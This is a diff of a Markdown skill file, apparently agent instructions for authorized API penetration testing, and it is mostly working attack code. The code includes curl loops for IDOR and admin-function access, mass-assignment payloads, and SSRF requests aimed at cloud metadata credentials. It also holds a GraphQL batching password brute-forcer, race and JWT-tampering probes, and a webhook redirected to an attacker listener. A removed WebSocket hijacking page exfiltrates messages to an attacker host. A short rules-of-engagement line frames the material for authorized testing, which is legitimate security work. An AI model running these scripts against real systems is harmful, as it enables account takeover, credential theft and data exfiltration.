@@ -1,6 +1,6 @@
 ---
 name: offensive-api-security
-description: "API security testing: BOLA/IDOR, broken auth, BFLA, mass assignment, SSRF, gRPC, WebSocket. Triggers - OWASP API Top 10, BOLA, IDOR, gRPC."
+description: "API security and business-logic abuse: BOLA/IDOR, BFLA, mass assignment, broken auth, GraphQL, JWT, race, webhook, gRPC, WebSocket. Triggers - OWASP API Top 10, business logic, race."
 ---
 
 ## Rules of Engagement
@@ -8,130 +8,85 @@ Only test systems you are authorized to assess. Confirm the written scope and ra
 
 # Offensive API Security Testing
 
-You are conducting authorized security assessments against API-driven applications. This skill covers REST, gRPC, and WebSocket attack surfaces with emphasis on the OWASP API Security Top 10 2023. Every technique assumes you have written authorization and a defined scope. Your goal is to identify vulnerabilities that allow unauthorized data access, privilege escalation, or service disruption through API-layer attacks.
+Authorized testing of REST, GraphQL, gRPC, and WebSocket APIs against the OWASP API Top 10 and the business-logic gaps scanners miss.
 
-## Quick Workflow
+## BOLA and IDOR
 
-1. Map the API surface: collect OpenAPI/Swagger specs, gRPC reflection output, and WebSocket endpoints.
-2. Enumerate authentication mechanisms: API keys, OAuth flows, JWTs, session tokens.
-3. Test BOLA/IDOR by substituting object identifiers across authenticated contexts.
-4. Probe authorization boundaries with BFLA checks across roles and HTTP methods.
-5. Fuzz parameters for mass assignment, content-type switching, and verb tampering.
-6. Assess rate limiting and resource consumption controls.
-7. Test gRPC-specific vectors: reflection enumeration, metadata injection, protobuf manipulation.
-8. Evaluate WebSocket security: origin validation, message integrity, CSWSH.
-9. Check for SSRF via URL-accepting parameters and webhook configurations.
-10. Document findings with reproduction steps and severity ratings.
-
----
-
-## OWASP API Top 10 2023 -- BOLA and IDOR
-
-Broken Object Level Authorization (BOLA) is the most prevalent API vulnerability. You test it by capturing a legitimate request containing an object identifier and replaying it with identifiers belonging to other users or tenants.
-
-```http
-GET /api/v1/users/1001/orders HTTP/1.1
-Authorization: Bearer eyJhbGciOi...user_a_token
-Host: target.example.com
-```
-
-Replay with a different user ID while retaining the original token:
-
-```http
-GET /api/v1/users/1002/orders HTTP/1.1
-Authorization: Bearer eyJhbGciOi...user_a_token
-Host: target.example.com
-```
-
-Automate IDOR testing across sequential and UUID-based identifiers:
+Broken Object Level Authorization is the most prevalent API flaw. Capture a legitimate request containing an object identifier and replay it with another user's identifier, keeping your token, e.g. `GET /api/v1/users/1002/orders` with user A's `Authorization` header.
 
 ```bash
-# Sequential ID enumeration
 for id in $(seq 1000 1050); do
-  status=$(curl -s -o /dev/null -w "%{http_code}" \
-    -H "Authorization: Bearer $TOKEN_A" \
-    "https://target.example.com/api/v1/users/${id}/orders")
-  echo "ID: ${id} -> HTTP ${status}"
-done
-```
+  curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer $TOKEN_A" \
+    "https://target.example.com/api/v1/users/${id}/orders"
+done; echo
 
-```bash
-# Test with collected UUIDs from other endpoints
-while read -r uuid; do
-  resp=$(curl -s -H "Authorization: Bearer $TOKEN_A" \
-    "https://target.example.com/api/v1/documents/${uuid}")
-  echo "UUID: ${uuid} -> $(echo "$resp" | jq -r '.owner // "no_owner_field"')"
-done < collected_uuids.txt
-```
-
-Test across HTTP methods -- an endpoint may enforce authorization on GET but not on PUT or DELETE:
-
-```bash
+# Authorization is often enforced on GET but not on write methods
 for method in GET PUT PATCH DELETE; do
-  curl -s -o /dev/null -w "${method} -> %{http_code}\n" \
-    -X "${method}" \
-    -H "Authorization: Bearer $TOKEN_A" \
-    -H "Content-Type: application/json" \
-    -d '{"status":"cancelled"}' \
-    "https://target.example.com/api/v1/users/1002/orders/5001"
+  curl -s -o /dev/null -w "${method} %{http_code}\n" -X "$method" \
+    -H "Authorization: Bearer $TOKEN_A" -H "Content-Type: application/json" \
+    -d '{"status":"cancelled"}' "https://target.example.com/api/v1/users/1002/orders/5001"
 done
 ```
 
----
+## Broken Authentication
 
-## Broken Authentication and Excessive Data Exposure
-
-Test authentication endpoints for credential stuffing resilience, token lifecycle weaknesses, and information leakage in API responses.
+Probe login rate limits and token lifecycle. JWT-specific abuse: see `web-auth-bypass-idor`.
 
 ```bash
-# Rapid credential testing -- probe for missing rate limits on login
 for i in $(seq 1 100); do
-  code=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X POST -H "Content-Type: application/json" \
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" \
     -d "{\"email\":\"test@example.com\",\"password\":\"attempt${i}\"}" \
     "https://target.example.com/api/v1/auth/login")
-  echo "Attempt ${i}: HTTP ${code}"
-  [ "$code" = "429" ] && echo "Rate limit hit at attempt ${i}" && break
+  echo "Attempt ${i}: HTTP ${code}"; [ "$code" = "429" ] && break
 done
 ```
 
-Check for excessive data exposure by comparing full API responses against what the UI renders. Look for internal IDs, other users' emails, hashed passwords, role assignments, or PII the client never displays:
+Also replay expired tokens, tokens issued before a password change, and malformed bearer values (`""`, `"null"`, `"Bearer"`) against `/users/me`.
+
+## BFLA, Mass Assignment, and BOPLA
+
+Broken Function Level Authorization: low-privilege users invoking admin functions. Mass assignment and excessive data exposure are property-level (BOPLA) failures.
 
 ```bash
-curl -s -H "Authorization: Bearer $TOKEN" \
+for ep in "GET /api/v1/admin/users" "POST /api/v1/admin/users" \
+  "DELETE /api/v1/admin/users/1001" "GET /api/v1/admin/config"; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X "${ep%% *}" \
+    -H "Authorization: Bearer $REGULAR_USER_TOKEN" "https://target.example.com${ep#* }")
+  echo "${ep} -> HTTP ${code}"
+done
+```
+
+```bash
+# Mass assignment: inject properties that should not be user-controllable
+curl -s -X PUT -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"name":"Updated Name","role":"admin","is_admin":true,
+       "permissions":["admin","superuser"],"account_type":"premium"}' \
   "https://target.example.com/api/v1/users/me" | jq .
+
+# Excessive data exposure: compare the full response against what the UI renders
+curl -s -H "Authorization: Bearer $TOKEN" "https://target.example.com/api/v1/users/me" | jq .
 ```
 
-Test token validation weaknesses:
+Verb tampering, method-override headers, and content-type switching frequently bypass method- or format-scoped controls:
 
 ```bash
-# Expired token, post-password-change token, malformed bearer values
-curl -s -o /dev/null -w "Expired: %{http_code}\n" \
-  -H "Authorization: Bearer $EXPIRED_TOKEN" \
-  "https://target.example.com/api/v1/users/me"
-
-curl -s -o /dev/null -w "Pre-change: %{http_code}\n" \
-  -H "Authorization: Bearer $PRE_PASSWORD_CHANGE_TOKEN" \
-  "https://target.example.com/api/v1/users/me"
-
-for val in "" "null" "undefined" "Bearer" "Bearer "; do
-  curl -s -o /dev/null -w "Value '${val}' -> %{http_code}\n" \
-    -H "Authorization: ${val}" \
-    "https://target.example.com/api/v1/users/me"
+for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
+  curl -s -o /dev/null -w "${method} %{http_code}\n" -X "$method" \
+    -H "Authorization: Bearer $TOKEN" "https://target.example.com/api/v1/admin/settings"
 done
+curl -s -X POST -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer $TOKEN" \
+  "https://target.example.com/api/v1/users/1002"
 ```
 
----
+## SSRF
 
-## Rate Limiting and Resource Consumption
+URL-accepting API parameters, webhook registration, and import/export features can reach internal services or cloud metadata. Payloads, filtering bypasses, and proof technique: see `web-ssrf`. Confirm an API-specific fetch by pointing a callback/import URL at `http://169.254.169.254/latest/meta-data/`.
 
-Test for Unrestricted Resource Consumption (API4:2023) by assessing whether the API enforces limits on request frequency, payload size, and response pagination.
+## Rate Limiting, Pagination, and Resource Consumption
 
 ```bash
-# Measure rate limit headers across rapid requests
 for i in $(seq 1 50); do
-  curl -s -D - -o /dev/null \
-    -H "Authorization: Bearer $TOKEN" \
+  curl -s -D - -o /dev/null -H "Authorization: Bearer $TOKEN" \
     "https://target.example.com/api/v1/search?q=test" 2>&1 | \
     grep -iE "x-rate|retry-after|x-ratelimit"
   sleep 0.1
@@ -139,369 +94,184 @@ done
 ```
 
 ```bash
-# Pagination abuse and large payload submission
+# Probe total counts, oversized page sizes, negative pages
 curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://target.example.com/api/v1/products?page=1&per_page=100000" | jq 'length'
-
-python3 -c "
-import json, sys
-payload = {'name': 'A' * 1000000, 'tags': ['x'] * 10000}
-sys.stdout.write(json.dumps(payload))
-" | curl -s -o /dev/null -w "Large payload: %{http_code}\n" \
-  -X POST -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" -d @- \
-  "https://target.example.com/api/v1/products"
-```
-
----
-
-## BFLA and Mass Assignment
-
-Broken Function Level Authorization (BFLA) occurs when low-privilege users can invoke administrative API functions. Mass assignment exploits occur when the API binds client-supplied data directly to internal object properties.
-
-```bash
-# BFLA: Test admin endpoints with regular user token
-admin_endpoints=(
-  "GET /api/v1/admin/users"
-  "POST /api/v1/admin/users"
-  "DELETE /api/v1/admin/users/1001"
-  "GET /api/v1/admin/config"
-  "PUT /api/v1/admin/config"
-  "GET /api/v1/internal/metrics"
-)
-
-for ep in "${admin_endpoints[@]}"; do
-  method=$(echo "$ep" | cut -d' ' -f1)
-  path=$(echo "$ep" | cut -d' ' -f2)
-  code=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X "$method" -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
-    "https://target.example.com${path}")
-  echo "${method} ${path} -> HTTP ${code}"
-done
-```
-
-```bash
-# Mass assignment: inject properties that should not be user-controllable
-curl -s -X PUT \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "name": "Updated Name",
-    "role": "admin",
-    "is_admin": true,
-    "permissions": ["admin", "superuser"],
-    "account_type": "premium",
-    "credit_balance": 99999
-  }' \
-  "https://target.example.com/api/v1/users/me" | jq .
-```
-
----
-
-## REST Verb Tampering and Content-Type Switching
-
-APIs sometimes apply security controls only to expected HTTP methods or content types. You exploit this by sending requests with unexpected methods or by switching the serialization format.
-
-```bash
-# Verb tampering: test all methods against a restricted endpoint
-for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" \
-    -X "$method" -H "Authorization: Bearer $TOKEN" \
-    "https://target.example.com/api/v1/admin/settings")
-  echo "${method} -> HTTP ${code}"
-done
-```
-
-```bash
-# Method override headers -- bypass method-based WAF rules
-curl -s -X POST \
-  -H "X-HTTP-Method-Override: DELETE" \
-  -H "Authorization: Bearer $TOKEN" \
-  "https://target.example.com/api/v1/users/1002"
-
-curl -s -X POST \
-  -H "X-Method-Override: PUT" -H "X-HTTP-Method: PATCH" \
-  -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"role":"admin"}' \
-  "https://target.example.com/api/v1/users/me"
-```
-
-```bash
-# Content-type switching and parameter pollution
-curl -s -X POST -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "username=admin&password=test&role=admin" \
-  "https://target.example.com/api/v1/users"
-
-curl -s -X POST -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/xml" \
-  -d '<?xml version="1.0"?><user><name>test</name><role>admin</role></user>' \
-  "https://target.example.com/api/v1/users"
-
-# Parameter pollution via duplicate keys
+  "https://target.example.com/api/v1/users?page=1&per_page=1" | \
+  jq '{total: .total, total_pages: .total_pages, current_page: .page}'
 curl -s -H "Authorization: Bearer $TOKEN" \
-  "https://target.example.com/api/v1/transfer?to=attacker&amount=100&to=victim"
+  "https://target.example.com/api/v1/users?page=1&per_page=999999" | jq 'length'
+
+# Forge a cursor to access arbitrary records, and inject sort/filter fields
+forged_cursor=$(echo -n '{"id":1}' | base64 -w0)
+curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://target.example.com/api/v1/users?cursor=${forged_cursor}&limit=100" | jq .
+curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://target.example.com/api/v1/users?sort=password&order=asc" | jq .
 ```
 
----
+Oversized input tests whether body size and complexity are bounded; reuse the rate-limit loop above with a multi-megabyte JSON body.
 
-## SSRF via API Parameters
+## Business Logic and Workflow Bypass
 
-Server-Side Request Forgery through URL-accepting API parameters allows you to reach internal services or cloud metadata endpoints.
+Individual endpoints may be secure while the workflow connecting them is not. Map the intended sequence, then deviate: skip steps, reorder them, or replay a validated state.
 
 ```bash
-ssrf_payloads=(
-  "http://169.254.169.254/latest/meta-data/"
-  "http://metadata.google.internal/computeMetadata/v1/"
-  "http://127.0.0.1:8080/admin"
-  "http://[::1]:8080/"
-  "http://0x7f000001/"
-  "http://internal-service.local/"
-)
+# Normal flow: add_to_cart -> apply_coupon -> calculate_total -> pay -> confirm
+# Test: skip payment and go straight to confirmation
+curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"cart_id": "CART-12345"}' "https://target.example.com/api/v1/orders/confirm" | jq .
 
-for payload in "${ssrf_payloads[@]}"; do
-  echo "--- Testing: ${payload}"
-  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
-    -H "Content-Type: application/json" \
-    -d "{\"webhook_url\": \"${payload}\"}" \
-    "https://target.example.com/api/v1/integrations/webhook" | head -c 500
-  echo
-done
+# State manipulation / negative quantities / currency confusion
+curl -s -X PATCH -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"status":"pending"}' "https://target.example.com/api/v1/orders/ORD-5001"
+curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"product_id":"PROD-001","quantity":-1}' "https://target.example.com/api/v1/cart/items"
 ```
 
-Test SSRF through import/export and profile features:
+Price/eligibility manipulation: add an item that changes eligibility, force recalculation, then remove it and proceed with the original total.
 
-```bash
-curl -s -X POST -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"import_url": "http://169.254.169.254/latest/user-data"}' \
-  "https://target.example.com/api/v1/data/import"
+## Race Conditions and Double-Spend
 
-curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
-  -H "Content-Type: application/json" \
-  -d '{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
-  "https://target.example.com/api/v1/users/me/profile"
-```
-
----
-
-## gRPC Security Testing
-
-gRPC services expose a different attack surface than REST. You use reflection to enumerate services, grpcurl to craft requests, and mitmproxy to intercept protobuf traffic.
-
-```bash
-# Enumerate services via gRPC reflection
-grpcurl -plaintext target.example.com:50051 list
-grpcurl -plaintext target.example.com:50051 describe myapp.UserService
-grpcurl -plaintext target.example.com:50051 describe myapp.UserService.GetUser
-```
-
-```bash
-# Test BOLA on gRPC -- access another user's data with your token
-grpcurl -plaintext \
-  -H "authorization: Bearer $TOKEN_A" \
-  -d '{"user_id": "1002"}' \
-  target.example.com:50051 myapp.UserService/GetUser
-
-# Test admin methods with regular user credentials
-grpcurl -plaintext \
-  -H "authorization: Bearer $REGULAR_TOKEN" \
-  -d '{}' \
-  target.example.com:50051 myapp.AdminService/ListAllUsers
-```
-
-Metadata injection -- gRPC metadata headers can be exploited similarly to HTTP headers:
-
-```bash
-grpcurl -plaintext \
-  -H "authorization: Bearer $TOKEN" \
-  -H "x-forwarded-for: 127.0.0.1" \
-  -H "x-internal-service: true" \
-  -H "x-user-role: admin" \
-  -d '{}' \
-  target.example.com:50051 myapp.AdminService/GetConfig
-```
-
-Intercept and modify gRPC traffic with mitmproxy:
+APIs that fail to serialize concurrent requests against shared state allow duplicate transactions, limit bypass, or balance corruption. Detect double-spend by firing parallel identical requests and counting successes beyond the intended one-per-user limit; do not rely on any single transfer moving funds. Single-use resources (coupons, invitations, limited stock) are the cleanest signal.
 
 ```python
-# mitmproxy addon for gRPC inspection (save as grpc_inspector.py)
-# Run: mitmproxy -s grpc_inspector.py --mode reverse:https://target:50051
-from mitmproxy import http
+#!/usr/bin/env python3
+"""Race probe: count concurrent successes against a single-use resource."""
+import asyncio, aiohttp
+TARGET, HEADERS = "https://target.example.com/api/v1", {"Authorization": "Bearer YOUR_TOKEN"}
 
-class GrpcInspector:
-    def request(self, flow: http.HTTPFlow):
-        if flow.request.headers.get("content-type", "").startswith("application/grpc"):
-            print(f"[gRPC] {flow.request.method} {flow.request.path}")
-            for k, v in flow.request.headers.items():
-                if not k.startswith(":"):
-                    print(f"  Metadata: {k}: {v}")
+async def post(session, path, data):
+    async with session.post(f"{TARGET}{path}", json=data, headers=HEADERS) as resp:
+        await resp.read(); return resp.status
 
-    def response(self, flow: http.HTTPFlow):
-        if flow.response and "grpc-status" in flow.response.headers:
-            print(f"[gRPC Response] Status: {flow.response.headers['grpc-status']}")
+async def race(path, data, n=20):
+    async with aiohttp.ClientSession() as session:
+        results = await asyncio.gather(*[post(session, path, data) for _ in range(n)])
+        print(f"{path}: {len([s for s in results if s in (200, 201)])}/{n} succeeded")
 
-addons = [GrpcInspector()]
+asyncio.run(race("/cart/coupon", {"coupon_code": "SINGLE-USE"}, n=20))
 ```
 
----
+## GraphQL Batching and Depth Abuse
 
-## WebSocket Security Testing
-
-WebSocket connections bypass many traditional HTTP security controls. You test origin validation, message injection, authentication persistence, and cross-site WebSocket hijacking.
+GraphQL batching and nesting bypass per-request rate limiting and authorization. Batching packs many login mutations into one HTTP request; depth and field duplication test whether query complexity is bounded.
 
 ```bash
-# Origin validation testing with websocat
-websocat -H "Origin: https://evil.example.com" "wss://target.example.com/ws/chat"
-websocat "wss://target.example.com/ws/chat"  # no origin
-websocat -H "Origin: https://subdomain.target.example.com" "wss://target.example.com/ws/chat"
+curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
+  -d '{"query": "{ __schema { types { name kind fields { name } } } }"}' \
+  "https://target.example.com/graphql" | jq '.data.__schema.types[] | select(.kind == "OBJECT")'
+
+curl -s -X POST -H "Content-Type: application/json" -H "Authorization: Bearer $TOKEN" \
+  -d '{"query": "{ users { posts { comments { author { posts { comments { author { name } } } } } } } }"}' \
+  "https://target.example.com/graphql"
 ```
 
 ```python
 #!/usr/bin/env python3
-"""WebSocket message fuzzing and injection testing."""
+"""GraphQL batching: more auth attempts than the per-request rate limit allows."""
+import requests, sys
+TARGET, BATCH_SIZE = "https://target.example.com/graphql", 50
+passwords = [l.strip() for l in open(sys.argv[2]) if l.strip()]
+for i in range(0, len(passwords), BATCH_SIZE):
+    batch = passwords[i:i + BATCH_SIZE]
+    payload = [{"query": f'mutation a{j} {{ login(email:"{sys.argv[1]}", password:"{p}") {{ success }} }}'}
+               for j, p in enumerate(batch)]
+    resp = requests.post(TARGET, json=payload)
+    if resp.status_code == 429:
+        print(f"[!] rate limited at {i}"); break
+    for j, r in enumerate(resp.json()):
+        if r.get("data", {}).get("login", {}).get("success"):
+            print(f"[+] {sys.argv[1]}:{batch[j]}"); sys.exit()
+```
+
+## JWT Tampering
+
+Algorithm confusion, `none`/`kid`/`jku` injection, and claim tampering: see `web-auth-bypass-idor`. Fast API check with a guessed or empty secret:
+
+```bash
+jwt_tool "$JWT_TOKEN" -X a                 # RS256 -> HS256 confusion
+jwt_tool "$JWT_TOKEN" -I -pc role -pv admin -S hs256 -p "$KNOWN_SECRET"
+```
+
+## Webhook Abuse
+
+Webhook registration redirects server-initiated callbacks to attacker-controlled endpoints, enabling data interception and SSRF.
+
+```bash
+curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+  -d '{"url":"https://attacker-listener.example.com/webhook",
+       "events":["user.created","order.completed","payment.received"]}' \
+  "https://target.example.com/api/v1/webhooks" | jq .
+
+# Existing webhooks may reveal internal URLs and event names
+curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://target.example.com/api/v1/webhooks" | jq '.[] | {id, url, events}'
+
+# Blind SSRF via internal callback targets
+for target_url in "http://127.0.0.1:8080/admin" \
+  "http://169.254.169.254/latest/meta-data/" "http://elasticsearch.internal:9200/_cat/indices"; do
+  curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+    -d "{\"url\": \"${target_url}\", \"events\": [\"test.ping\"]}" \
+    "https://target.example.com/api/v1/webhooks" | head -c 200; echo
+done
+```
+
+## gRPC Testing
+
+Enumerate via reflection, then test object- and function-level authorization with your own token.
+
+```bash
+grpcurl -plaintext target.example.com:50051 list
+grpcurl -plaintext target.example.com:50051 describe myapp.UserService
+
+# BOLA: request another user's object; BFLA: admin method with a regular token
+grpcurl -plaintext -H "authorization: Bearer $TOKEN_A" \
+  -d '{"user_id": "1002"}' target.example.com:50051 myapp.UserService/GetUser
+grpcurl -plaintext -H "authorization: Bearer $REGULAR_TOKEN" \
+  -d '{}' target.example.com:50051 myapp.AdminService/ListAllUsers
+
+# Metadata injection mirrors HTTP header trust
+grpcurl -plaintext -H "authorization: Bearer $TOKEN" \
+  -H "x-forwarded-for: 127.0.0.1" -H "x-user-role: admin" \
+  -d '{}' target.example.com:50051 myapp.AdminService/GetConfig
+```
+
+Intercept protobuf traffic with a mitmproxy addon logging `application/grpc` requests and `grpc-status` responses.
+
+## WebSocket Testing
+
+WebSockets bypass many HTTP controls. Test origin validation, message-level authorization, and Cross-Site WebSocket Hijacking.
+
+```bash
+websocat -H "Origin: https://evil.example.com" "wss://target.example.com/ws/chat"
+websocat "wss://target.example.com/ws/chat"
+```
+
+```python
+#!/usr/bin/env python3
+"""WebSocket message fuzzing: authorization and size handling."""
 import asyncio, websockets, json
 
 async def test_ws_injection(url, token):
-    headers = {"Cookie": f"session={token}"}
-    async with websockets.connect(url, extra_headers=headers) as ws:
-        test_payloads = [
-            json.dumps({"type": "message", "content": "hello"}),
-            json.dumps({"type": "message", "content": "hello", "user_id": "1002"}),
-            json.dumps({"type": "admin_broadcast", "content": "injected"}),
-            json.dumps({"type": "subscribe", "channel": "../admin/notifications"}),
-            json.dumps({"type": "message", "content": "A" * 1000000}),
-        ]
-        for payload in test_payloads:
+    async with websockets.connect(url, extra_headers={"Cookie": f"session={token}"}) as ws:
+        for payload in [json.dumps({"type": "message", "content": "hello", "user_id": "1002"}),
+                        json.dumps({"type": "subscribe", "channel": "../admin/notifications"}),
+                        json.dumps({"type": "message", "content": "A" * 1000000})]:
             await ws.send(payload)
             try:
-                response = await asyncio.wait_for(ws.recv(), timeout=3)
-                print(f"Sent: {payload[:80]}\nRecv: {response[:200]}\n---")
+                print(await asyncio.wait_for(ws.recv(), timeout=3))
             except asyncio.TimeoutError:
-                print(f"Sent: {payload[:80]} -> No response\n---")
+                print(f"Sent: {payload[:60]} -> no response")
 
 asyncio.run(test_ws_injection("wss://target.example.com/ws/chat", "SESSION_TOKEN"))
 ```
 
-Cross-Site WebSocket Hijacking (CSWSH) verification:
-
-```html
-<!-- Host on attacker-controlled domain -- authorized testing only -->
-<script>
-  var ws = new WebSocket("wss://target.example.com/ws/chat");
-  ws.onopen = function() {
-    console.log("[CSWSH] Connection opened -- origin validation missing");
-    ws.send(JSON.stringify({type: "message", content: "cswsh-test"}));
-  };
-  ws.onmessage = function(evt) {
-    console.log("[CSWSH] Received: " + evt.data);
-    fetch("https://attacker-log.example.com/log", {method: "POST", body: evt.data});
-  };
-  ws.onerror = function(e) {
-    console.log("[CSWSH] Connection failed -- origin may be validated");
-  };
-</script>
-```
-
----
-
-## API Versioning and Security Misconfiguration
-
-APIs that maintain multiple versions often have inconsistent security controls. Deprecated versions may lack patches applied to current versions.
-
-```bash
-# Enumerate API versions
-versions=("v1" "v2" "v3" "v0" "v1-beta" "v2-beta" "internal" "latest" "dev" "staging")
-for ver in "${versions[@]}"; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" \
-    -H "Authorization: Bearer $TOKEN" \
-    "https://target.example.com/api/${ver}/users/me")
-  [ "$code" != "404" ] && echo "Version '${ver}' -> HTTP ${code}"
-done
-```
-
-```bash
-# Check for exposed documentation and debug endpoints
-endpoints=(
-  "/swagger.json" "/swagger-ui/" "/openapi.json" "/api-docs"
-  "/graphql" "/graphiql" "/.well-known/openid-configuration"
-  "/actuator" "/actuator/env" "/actuator/health"
-  "/debug" "/trace" "/metrics" "/_profiler"
-)
-for ep in "${endpoints[@]}"; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.example.com${ep}")
-  [ "$code" != "404" ] && [ "$code" != "000" ] && echo "${ep} -> HTTP ${code}"
-done
-```
-
-```bash
-# CORS misconfiguration testing
-curl -s -D - -o /dev/null \
-  -H "Origin: https://evil.example.com" -X OPTIONS \
-  "https://target.example.com/api/v1/users/me" 2>&1 | \
-  grep -iE "access-control|allow-origin|allow-credentials"
-
-curl -s -D - -o /dev/null -H "Origin: null" \
-  "https://target.example.com/api/v1/users/me" 2>&1 | grep -i "access-control"
-
-# Security header audit
-curl -s -D - -o /dev/null "https://target.example.com/api/v1/health" 2>&1 | \
-  grep -iE "x-content-type|x-frame|strict-transport|content-security|x-powered-by|server:"
-```
-
----
-
-## Detection / Defender View
-
-When you run these tests, you leave artifacts that defenders and monitoring systems detect:
-
-- **BOLA/IDOR probes** generate sequences of requests with incrementing or random object IDs from a single session. API gateways log unusual access patterns across object identifiers. Anomaly detection flags accounts accessing resources outside their normal scope.
-
-- **Rate limit testing** produces burst traffic visible in access logs. HTTP 429 responses trigger SIEM alerts. Repeated authentication failures activate account lockout mechanisms.
-
-- **Verb tampering and method override** requests with unusual HTTP methods or override headers stand out in access logs. Security-conscious applications alert on method override header usage.
-
-- **gRPC reflection enumeration** is logged by interceptors. Calls to the reflection service from non-development IPs trigger alerts. Metadata injection attempts appear in gRPC access logs.
-
-- **WebSocket testing** generates connection attempts with unusual Origin headers logged at the load balancer. CSWSH attempts may trigger CSP violation reports.
-
-- **SSRF payloads** containing internal IPs or metadata URLs are flagged by WAFs. Outbound connections to unexpected destinations trigger network monitoring alerts.
-
-- **Version probing** creates 404 bursts across multiple path prefixes from a single source IP.
-
----
-
-## Engagement Cheatsheet
-
-| Phase | Action | Tool |
-|-------|--------|------|
-| Reconnaissance | Collect API specs | Burp crawler, Swagger endpoints |
-| Reconnaissance | gRPC service enumeration | grpcurl with reflection |
-| Reconnaissance | WebSocket endpoint discovery | Burp Suite, DevTools |
-| Authentication | Token lifecycle testing | curl, Burp Repeater |
-| Authorization | BOLA/IDOR across objects | curl loops, Burp Intruder |
-| Authorization | BFLA across roles | curl with multiple tokens |
-| Input handling | Mass assignment | curl, Postman |
-| Input handling | Content-type switching | curl with varied headers |
-| Protocol | gRPC metadata injection | grpcurl |
-| Protocol | gRPC protobuf interception | mitmproxy with addon |
-| Protocol | WebSocket injection | websocat, Python websockets |
-| Protocol | CSWSH verification | Custom HTML test page |
-| Infrastructure | SSRF via URL parameters | curl, Burp Collaborator |
-| Infrastructure | API versioning bypass | curl version enumeration |
-| Infrastructure | Misconfiguration scan | curl, Burp scanner |
-
----
+CSWSH: from an attacker-origin page, open a WebSocket and confirm whether it authenticates on cookie alone and returns data.
 
 ## Key References
 
-- OWASP API Security Top 10 2023: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
-- gRPC Security Documentation: https://grpc.io/docs/guides/auth/
-- WebSocket Security (RFC 6455 Section 10): https://datatracker.ietf.org/doc/html/rfc6455#section-10
-- Burp Suite API Testing: https://portswigger.net/burp/documentation/desktop/testing-workflow/api-testing
-- grpcurl: https://github.com/fullstorydev/grpcurl
-- websocat: https://github.com/vi/websocat
-- mitmproxy: https://docs.mitmproxy.org/
-- PortSwigger Academy -- API Testing: https://portswigger.net/web-security/api-testing
+- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
+- OWASP WSTG -- Business Logic Testing: https://owasp.org/www-project-web-security-testing-guide/
+- gRPC auth: https://grpc.io/docs/guides/auth/
+- Race conditions: https://portswigger.net/web-security/race-conditions
 - "Hacking APIs" by Corey Ball (No Starch Press)
